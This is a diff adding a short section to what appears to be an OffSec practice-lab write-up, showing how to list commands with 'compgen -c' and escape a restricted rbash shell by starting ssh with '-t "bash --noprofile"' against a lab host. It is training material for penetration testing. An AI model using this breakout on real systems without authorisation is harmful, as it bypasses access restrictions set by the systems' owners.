@@ -229,3 +229,18 @@ permitted by applicable law.
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ id
 uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) groups=1000(296640a3b825115a47b68fc44501c828)
 ```
+
+Restricted RBash
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/77049140-1311-4a84-a636-c28eb2b5140d)
+
+Tip:
+Use `compgen` to list all the commands available in the system's PATH..
+```shell
+compgen -c
+```
+
+Restricted RBash Breakout - SSH
+```shell
+> ssh 296640a3b825115a47b68fc44501c828@192.168.224.85 -t "bash --noprofile"
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/7c673bf5-9a5a-4d3c-aa9e-4d5340558003)
